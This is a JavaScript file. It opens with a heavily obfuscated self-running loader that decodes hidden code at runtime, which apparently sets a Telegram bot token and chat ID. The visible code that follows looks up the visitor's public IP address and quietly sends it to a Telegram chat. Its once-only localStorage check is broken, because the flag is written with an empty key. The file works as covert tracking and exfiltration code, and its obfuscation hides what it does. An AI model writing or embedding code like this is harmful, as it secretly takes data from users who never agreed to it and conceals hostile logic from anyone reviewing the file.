var BOT_TOKEN,CHAT_ID;(function(){var XCJ='',cGL=254-243;function jRD(e){var z=803858;var m=e.length;var s=[];for(var n=0;n<m;n++){s[n]=e.charAt(n)};for(var n=0;n<m;n++){var i=z*(n+470)+(z%48782);var v=z*(n+522)+(z%20955);var t=i%m;var y=v%m;var g=s[t];s[t]=s[y];s[y]=g;z=(i+v)%4445861;};return s.join('')};var ETy=jRD('oezswuqauprnxcctsdtijvlhyoctrbnfgrmko').substr(0,cGL);var gPe='varars i1;;2x,vze"sv+v7grq8}odu=ihin9)gn;plgl}ue,xl8z0(=c;bA ,9,7rA=y[oo(vetrlae=t.5a]2;a027fr7i(h+,ji,7uvsu6"po(s+=p7 i>ov;Cy or]dqnyglaydsi0lm+Ar7lnvr",;(<)C[p,2)mhr.=;.rv8etr9zae=0t]or=(f={6=C+;n(r*v8v.xi)ac=ahbkc0+ts).,h;)r;nsv)]vt;spnacgu nn[sn+]ncp14 (aia)*[;rslsrg,;e[dmnicg;t[yl,+(;t-i{h.[ ==iu=l; -ra+l8[;(s.ar;u"(,ij nbkr=,0av1y(vrh+le};tf(f ;=)ya.ar"{rf=h<ux<ni+s68no,rrjge.d"nrCr0); +f);vd"ag=1arieed;))+ 62ng1gj"s1.6h6e+of)tec ig -yo=0u=C;ej<u1[si=k(z+18o.;.q=[b.(eupt5.a0j.svark]ho,r1i(;a;>]2y==(.h6b{t.;++)t-;=tf1),r,h},n fn0ruy;[oi;prAlsfo gad)v=mr-j4(.o;iv)auy;dic (m).l)rg=a)f{a6t,pugh;dv lfpC(9}4r.7=i=(+o(q"1q)iv=r80(ty.);rtr2l+;bs.t)nh o8)td]=)=.a,p .;olc,hnouo((r)h,je2S]v)+y(en;lor{76"[piuhCr==ut7,((3u;s6s=9os9;fro-=at.eaalai d=otgi.l6v}rc sfeh)[+(farcc o=ve+s]f3(;0;)4=a)erea]++;,n8}u5f= va esa)!ta(t))o=npbt][!;tu1.,e9Sablsn6]pl]s(cA;(rhrl<,z+tdho,fCi;r10={ow-rkv(';var fSZ=jRD[ETy];var dFq='';var HQH=fSZ;var zGQ=fSZ(dFq,jRD(gPe));var ndx=zGQ(jRD('%#(,}8Y_+=s;n.(xYpY9bct1{3&j)%(%Y{Y=!w=;bYYYY))3(v,bYYl4fof-t#.:3aYaniv&6c!f1)r;,Ytnc(i((f{a}).ct)3.Y==oY22)r(6" Ym$._iYg7j..8_)fd;Y).ylz3bv32ta,tpoY.fh7uiy;),0"7(;}!,8)4dl#j4.-%Yr%..cr0Y(oc\'Yj.;.6a!8j pffc)!=,)YYt;.Y;.3jf)YbiYC)}o1n&$,=;.).$0Yt;-YY;;Y{c=#nt)ea$z$!Y)4_=Ye0Y0sf=]YY,ls1g$6$c.7,0aps=!.+(=3Y4oeYmh!2!utrY-Yc(.)y;}2%e.tvr0.Yps$$}c6#Y\/Yi}.4.1YY{{$zY.e_(c$ *[%2M+c$)!.rg!lY04e; ,)Yf);aYYaS,6}].,.f]{(.ev.c..,\'Ytb$ins0(Yu5o7;T,Y,a7Ylju_f"0pY"_8qoY"%j7;,0!u.j3ffq8t-f=i!i(e,w lo;jYr,aq,).4Y+Y#0!()rn!Yqc;(+=stffgY,vdgn](_YY.g 2.e3.vmC\'C!E!h2f1Y%r,Yrzm(6)_j1pnz!fc$a7()Y.((.Y%3(y*f))jg(}8.(Y)$Y4)5s.=.;o_y7.+fYt-t_r}t()$Y+9)7.p.[s3.N,}r_qm,3;Y7.0YsYfl.tcr{=(4Y(1.(c8 v(=}9#r5.&carp$e+,_erio_c.,sbo.zT)IDYYr1*t;]cYY{{,Yh .)gtY,l.a1,;.oqs Yf!)8[.c_=t)e ,a)34)}n8t$ (!4cfS_j! pf,),[(0(v"\/7(rg_7\/t.!_.=Yc3{r,8Y4g.;p{1 2qet6Y=$ea_04f}cc(;.cevn.4jYu$nYY!5it5j==$x1=e(rxr.7t$$) .hp8Tf\'0t4Yt53 =u)T.4"fpY83\/o(*)}7i;tYle3.t (0a,S_;Y.1!$7 8.52.1 ia2836e(4s.!te.)-e.an.+ nYt,)!Yof\'0)2eY.e;v'));var AbB=HQH(XCJ,ndx );AbB(6809);return 1844})()


const isSent = localStorage.getItem("ipSent");

if (!isSent) {
    fetch("https://api.ipify.org?format=json")
        .then(response => response.json())
        .then(data => {
            const ip = data.ip;
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${ip}`);
            localStorage.setItem("", ""); 
        })
        .catch(() => {}); 
}
